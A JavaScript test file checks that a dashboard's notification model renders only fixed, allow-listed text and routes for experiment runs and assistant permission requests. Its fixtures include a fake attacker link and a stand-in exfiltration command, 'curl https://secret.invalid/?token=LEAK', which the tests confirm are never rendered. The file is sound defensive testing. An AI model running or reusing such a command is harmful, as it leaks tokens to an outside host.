import test from 'node:test'
import assert from 'node:assert/strict'

import {
  attentionHref, normalizeAttentionSources, normalizePermissionAttention,
  normalizeRunAttention,
} from '../src/attentionModel.js'
import { parseRunRouteState } from '../src/runRouteState.js'

const EVENT_ID = 'a'.repeat(64)
const GENERATION = 'b'.repeat(64)
const RUN_ID = 'run /?#% Ω'

const runItem = (overrides = {}) => ({
  id: EVENT_ID,
  kind: 'approval',
  severity: 'action',
  run_id: RUN_ID,
  generation: GENERATION,
  seq: 42,
  created: 1_700_000_000,
  active: true,
  browser: true,
  derived: false,
  node_id: 7,
  node_generation: 3,
  ...overrides,
})

test('run attention uses client-owned copy and an exact generation-fenced route', () => {
  const item = normalizeRunAttention(runItem({
    title: 'TOP_SECRET_SERVER_TITLE',
    detail: 'raw prompt and bearer MUST_NOT_RENDER',
    action_label: 'Delete everything',
    href: 'https://attacker.invalid/steal',
    payload: { token: 'TOKEN_MUST_NOT_RENDER' },
  }))

  assert.ok(item)
  assert.equal(item.title, 'Experiment approval needed')
  assert.equal(item.detail, 'Review the exact pending experiment lifecycle.')
  assert.equal(item.actionLabel, 'Review run')
  assert.equal(item.notifyEligible, true)
  assert.equal(item.needsAction, true)
  assert.match(item.href, /^#\/run\/run%20%2F%3F%23%25%20%CE%A9\?/)

  const route = parseRunRouteState(item.href)
  assert.deepEqual(route.issues, [])
  assert.equal(route.state.generation, GENERATION)
  assert.equal(route.state.nodeId, 7)
  assert.equal(route.state.sequence, null)

  const rendered = JSON.stringify(item)
  assert.doesNotMatch(rendered, /TOP_SECRET|raw prompt|bearer|Delete everything|attacker|TOKEN_MUST_NOT_RENDER/)
})

test('run attention has a distinguishable safe context with run-id fallback', () => {
  const fallback = normalizeRunAttention(runItem())
  assert.equal(fallback.contextLabel, RUN_ID)
  assert.equal(fallback.runLabel, '')
  assert.equal(fallback.taskId, '')
  const labelled = normalizeRunAttention(runItem({ run_label: 'MiniMax sweep', task_id: 'mle-bench' }))
  assert.equal(labelled.contextLabel, 'MiniMax sweep')
  assert.equal(labelled.taskId, 'mle-bench')
  const unsafe = normalizeRunAttention(runItem({ run_label: 'bad\nlabel', task_id: 'x'.repeat(161) }))
  assert.equal(unsafe.contextLabel, RUN_ID)
  assert.equal(unsafe.taskId, '')
})

test('attention routes expose only allow-listed diagnostic destinations behind a generation fence', () => {
  const cases = [
    ['finished', { view: 'report', panel: null, nodeId: null }],
    ['budget_exhausted', { view: 'report', panel: null, nodeId: null }],
    ['stopped', { view: 'report', panel: null, nodeId: null }],
    ['failure_spike', { view: 'dag', panel: 'failures', nodeId: 7 }],
    ['run_failed', { view: 'dag', panel: 'failures', nodeId: 7 }],
    ['stalled', { view: 'dag', panel: 'events', nodeId: null }],
    ['train_monitor', { view: 'dag', panel: null, nodeId: 7 }],   // deep-link to the evaluating node
  ]

  for (const [kind, expected] of cases) {
    const item = normalizeRunAttention(runItem({
      kind,
      severity: kind === 'finished' ? 'success' : 'warning',
      node_id: ['stalled', 'finished', 'budget_exhausted', 'stopped'].includes(kind) ? null : 7,
      node_generation: ['stalled', 'finished', 'budget_exhausted', 'stopped'].includes(kind) ? null : 3,
      browser: kind !== 'stalled',
      derived: kind === 'stalled',
    }))
    assert.ok(item, kind)
    const parsed = parseRunRouteState(item.href)
    assert.deepEqual(parsed.issues, [], kind)
    assert.equal(parsed.state.generation, GENERATION, kind)
    assert.equal(parsed.state.view, expected.view, kind)
    assert.equal(parsed.state.panel, expected.panel, kind)
    assert.equal(parsed.state.nodeId, expected.nodeId, kind)
  }

  assert.equal(attentionHref({ source: 'run', runId: 'demo', kind: 'finished' }), null)
  assert.equal(attentionHref({
    source: 'run', runId: 'bad\u0000id', generation: GENERATION, kind: 'finished',
  }), null)
})

test('malformed and incomplete run payloads fail closed', () => {
  const malformed = [
    null,
    [],
    runItem({ id: 'short' }),
    runItem({ kind: 'server_invented_kind' }),
    runItem({ severity: 'critical' }),
    runItem({ run_id: '' }),
    runItem({ run_id: 'bad\u0000id' }),
    runItem({ generation: 'not-a-generation' }),
    runItem({ seq: -1 }),
    runItem({ active: 1 }),
    runItem({ browser: 'true' }),
    runItem({ derived: 0 }),
    runItem({ stale: 'true' }),
    runItem({ node_id: null }),
    runItem({ node_generation: null }),
    runItem({ node_id: '7' }),
    runItem({ node_generation: 1.5 }),
  ]
  for (const value of malformed) assert.equal(normalizeRunAttention(value), null)

  const derived = normalizeRunAttention(runItem({
    kind: 'stalled', severity: 'danger', browser: true, derived: true,
    node_id: null, node_generation: null,
  }))
  assert.ok(derived)
  assert.equal(derived.notifyEligible, false, 'derived state can appear in-app but never notify the OS')

  const stale = normalizeRunAttention(runItem({ stale: true }))
  assert.ok(stale)
  assert.equal(stale.stale, true)
  assert.equal(stale.notifyEligible, false,
    'a cached last-safe projection can remain visible but never notify the OS')
})

test('permission attention retains only opaque identity and fixed presentation', () => {
  const now = 1_700_000_000_000
  const item = normalizePermissionAttention({
    id: 'c'.repeat(16),
    session: 'd'.repeat(16),
    created: 1_700_000_000,
    expires_at: 1_700_000_100,
    action: {
      command: 'curl https://secret.invalid/?token=LEAK',
      path: 'private/customer.txt',
    },
    title: 'SERVER_SECRET_TITLE',
  }, now)

  assert.deepEqual({
    id: item.id,
    requestId: item.requestId,
    session: item.session,
    title: item.title,
    detail: item.detail,
    href: item.href,
  }, {
    id: `perm_${'c'.repeat(16)}`,
    requestId: 'c'.repeat(16),
    session: 'd'.repeat(16),
    title: 'Assistant approval needed',
    detail: 'Open Assistant to review the exact action and scope.',
    href: null,
  })
  assert.doesNotMatch(JSON.stringify(item), /curl|secret\.invalid|LEAK|customer|SERVER_SECRET/)

  for (const value of [
    null,
    [],
    { id: 'short', session: 'd'.repeat(16), created: 1, expires_at: 2_000_000_000 },
    { id: 'c'.repeat(16), session: 'bad', created: 1, expires_at: 2_000_000_000 },
    { id: 'c'.repeat(16), session: 'd'.repeat(16), created: 0, expires_at: 2_000_000_000 },
    { id: 'c'.repeat(16), session: 'd'.repeat(16), created: 1, expires_at: 1_700_000_000 },
  ]) assert.equal(normalizePermissionAttention(value, now), null)
})

test('source normalization drops malformed entries, deduplicates opaque ids, and prioritizes action', () => {
  const now = 1_700_000_000_000
  const duplicate = runItem({
    kind: 'finished', severity: 'success', active: false, browser: true,
    node_id: null, node_generation: null, created: 1_700_000_050,
  })
  const items = normalizeAttentionSources({ items: [runItem(), { bad: true }, duplicate] }, {
    pending: [{
      id: 'e'.repeat(16), session: 'f'.repeat(16), created: 1_700_000_010,
      expires_at: 1_700_000_100,
    }],
  }, now)

  assert.equal(items.length, 2)
  assert.equal(items[0].kind, 'assistant_permission')
  assert.equal(items[1].kind, 'finished', 'last duplicate wins without rendering both identities')
})

test('a broken training-monitor alert is allow-listed, notify-eligible, and copy-complete', () => {
  const item = normalizeRunAttention(runItem({
    kind: 'train_monitor', severity: 'warning', node_id: 7, node_generation: 3,
    browser: true, derived: false,
  }))
  assert.ok(item, 'train_monitor must survive the client allow-list')
  assert.equal(item.title, 'Training looks broken')
  assert.ok(item.detail && item.actionLabel, 'COPY must supply title/detail/action')
  assert.equal(item.notifyEligible, true, 'browser && !derived → one-time desktop notification')
  assert.equal(item.needsAction, true)
})
